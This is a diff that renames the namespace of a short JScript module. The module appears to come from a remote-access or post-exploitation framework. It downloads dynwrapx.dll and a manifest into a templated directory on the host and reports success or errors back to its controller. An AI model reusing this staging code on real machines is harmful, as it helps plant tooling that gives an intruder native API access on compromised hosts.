@@ -1,13 +1,13 @@
 try
 {
-    entypreter.http.download("~DIRECTORY~/dynwrapx.dll", "~DLLUUID~");
-    entypreter.http.download("~DIRECTORY~/dynwrapx.manifest", "~MANIFESTUUID~");
+    proton.http.download("~DIRECTORY~/dynwrapx.dll", "~DLLUUID~");
+    proton.http.download("~DIRECTORY~/dynwrapx.manifest", "~MANIFESTUUID~");
 
-    entypreter.work.report("Success");
+    proton.work.report("Success");
 }
 catch (e)
 {
-    entypreter.work.error(e);
+    proton.work.error(e);
 }
 
-entypreter.exit();
+proton.exit();
